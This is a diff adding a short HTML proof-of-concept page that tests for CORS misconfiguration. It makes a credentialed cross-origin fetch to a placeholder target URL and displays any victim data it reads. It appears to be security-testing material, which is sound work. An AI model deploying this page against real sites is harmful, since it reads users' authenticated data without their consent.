@@ -1,0 +1,14 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>CORS PoC</title>
+<!-- Demonstrates whether a cross-origin credentialed read succeeds.
+     If <pre> fills with the victim's data, the CORS policy is broken. -->
+<body>
+<pre id="out">requesting…</pre>
+<script>
+  fetch('https://TARGET/CHANGE_ME', { credentials: 'include' })
+    .then(r => r.text())
+    .then(t => document.getElementById('out').textContent = t)
+    .catch(e => document.getElementById('out').textContent = 'blocked: ' + e);
+</script>
+</body>
